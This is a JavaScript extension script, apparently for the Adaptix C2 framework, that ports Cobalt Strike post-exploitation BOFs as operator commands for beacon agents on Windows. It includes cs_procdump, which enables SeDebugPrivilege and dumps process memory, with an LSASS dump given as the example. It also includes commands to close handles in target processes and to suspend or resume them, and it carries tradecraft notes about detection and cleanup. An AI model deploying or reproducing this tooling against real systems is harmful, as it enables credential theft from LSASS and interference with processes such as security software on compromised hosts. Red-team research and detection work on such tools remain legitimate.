var metadata = {
    name: "CS-Process-BOF",
    description: "Ported Cobalt Strike CS-Remote-OPs Process BOFs (prefix: cs_)"
};

/// COMMANDS
//
// Original CS -> Adaptix
//   procdump           -> cs_procdump           [PID] [FILEOUT]        pack "iZ" -> int,wstr
//   ProcessListHandles -> cs_processlisthandles [PID]                  pack "i"  -> int
//   ProcessDestroy     -> cs_processdestroy     [PID] [OPT:HANDLEID]   pack "ii" -> int,int
//   suspend            -> cs_suspend            [PID]                  pack "si" -> short,int (short = 1 for suspend, 0 for resume)
//   resume             -> cs_resume             [PID]                  pack "si" -> short,int


// ---------- cs_procdump ----------
var cmd_procdump = ax.create_command(
    "cs_procdump",
    "MiniDumpWriteDump a process to a file on the target. Enables SeDebugPrivilege first. Noisy/likely to be caught.",
    "cs_procdump 1234 C:\\Windows\\Temp\\lsass.dmp"
);
cmd_procdump.addArgInt("pid",     true, "PID to dump");
cmd_procdump.addArgString("fileout", true, "Output path on the TARGET (remember to clean up)");
cmd_procdump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let pid     = parsed_json["pid"];
    let fileout = parsed_json["fileout"];

    let bof_params = ax.bof_pack("int,wstr", [pid, fileout]);
    let bof_path = ax.script_dir() + "_bin/procdump." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `getprivs SeDebugPrivilege`, "Task: request SeDebugPrivilege for cs_procdump");
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: cs_procdump");
});


// ---------- cs_processlisthandles ----------
var cmd_plh = ax.create_command(
    "cs_processlisthandles",
    "List all open handles in a process (must have permission to open the process)",
    "cs_processlisthandles 1234"
);
cmd_plh.addArgInt("pid", true, "Target PID");
cmd_plh.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let pid = parsed_json["pid"];
    let bof_params = ax.bof_pack("int", [pid]);
    let bof_path = ax.script_dir() + "_bin/ProcessListHandles." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: cs_processlisthandles");
});


// ---------- cs_processdestroy ----------
var cmd_pd = ax.create_command(
    "cs_processdestroy",
    "Close a specific handle in a target process (HANDLEID in 1..65535), or close all handles if HANDLEID is omitted",
    "cs_processdestroy 1234 42"
);
cmd_pd.addArgInt("pid",      true,  "Target PID");
cmd_pd.addArgInt("handleid", false, "Optional handle ID (1..65535); if omitted, closes ALL handles");
cmd_pd.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let pid = parsed_json["pid"];
    let handleid = 0;
    if ("handleid" in parsed_json) {
        handleid = parseInt(parsed_json["handleid"]);
        if (isNaN(handleid) || handleid < 0 || handleid > 65535) {
            ax.console_message(id, "cs_processdestroy: handleid must be 0..65535\n", "error");
            return;
        }
    }
    let bof_params = ax.bof_pack("int,int", [pid, handleid]);
    let bof_path = ax.script_dir() + "_bin/ProcessDestroy." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: cs_processdestroy");
});


// ---------- cs_suspend / cs_resume ----------
// Shared BOF (suspendresume) - first arg is a short: 1 = suspend, 0 = resume.
function make_suspendresume_cmd(name, description, example, mode_val, task_msg) {
    let cmd = ax.create_command(name, description, example);
    cmd.addArgInt("pid", true, "Target PID");
    cmd.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
        let pid = parsed_json["pid"];
        let bof_params = ax.bof_pack("short,int", [mode_val, pid]);
        let bof_path = ax.script_dir() + "_bin/suspendresume." + ax.arch(id) + ".o";
        ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, task_msg);
    });
    return cmd;
}

var cmd_suspend = make_suspendresume_cmd(
    "cs_suspend", "Suspend all threads in a process", "cs_suspend 1234", 1, "Task: cs_suspend"
);
var cmd_resume  = make_suspendresume_cmd(
    "cs_resume",  "Resume all threads in a process",  "cs_resume 1234",  0, "Task: cs_resume"
);


/// REGISTER GROUP

var group_cs_process = ax.create_commands_group("CS-Process-BOF", [
    cmd_procdump,
    cmd_plh,
    cmd_pd,
    cmd_suspend,
    cmd_resume
]);
ax.register_commands_group(group_cs_process, ["beacon", "gopher", "kharon"], ["windows"], []);
